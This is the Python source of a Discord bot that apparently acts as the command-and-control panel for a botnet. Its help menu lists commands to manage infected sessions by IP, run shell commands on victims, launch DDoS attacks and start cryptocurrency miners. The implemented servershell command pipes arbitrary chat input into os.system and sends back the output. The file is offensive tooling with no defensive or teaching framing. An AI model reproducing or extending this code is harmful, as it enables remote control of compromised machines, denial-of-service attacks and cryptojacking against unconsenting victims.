import os
import discord
from discord.ext import commands
from discord import app_commands

token = '' #Token

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
bot.remove_command('help')

helpmenu = """```py
# Bot Commands
* !help                   # Help menu
* !clear                  # Clear chat
* !sessions               # List open sessions
* !kill                   # Close sessions
* !servershell            # Run command on Server.py
* !shell <cmd>            # Run command
* !ddos <ip> <byte>       # Starts DDoS Attack
* !stopddos               # Stops DDoS Attack
* !miner <wallet>         # Start miner
* !stopminer              # Stop miner

# Self Commands
* !kill.<ip>                  # Close session
* !shell.<ip> <cmd>           # Run command
* !ddos.<ip> <ip> <byte>      # Starts DDoS Attack
* !stopddos.<ip>              # Stops DDoS Attack
* !miner.<ip> <wallet>        # Start miner
* !stopminer.<ip>             # Stop miner
```"""

# log
@bot.event
async def on_ready():
    print(f'{bot.user}')

# help
@bot.command()
async def help(ctx):
    await ctx.send(helpmenu)

# clear
@bot.command(aliases=['purge', 'delete'])
async def clear(ctx):
    await ctx.channel.purge(limit=1000000)

# shell
@bot.command()
async def servershell(ctx, *args):
    arguments = ' '.join(args)
    os.system(f'{arguments} > output.txt')
    await ctx.send(file=discord.File(r'output.txt'))
    if os.path.exists("output.txt"):
        os.remove("output.txt")

bot.run(token)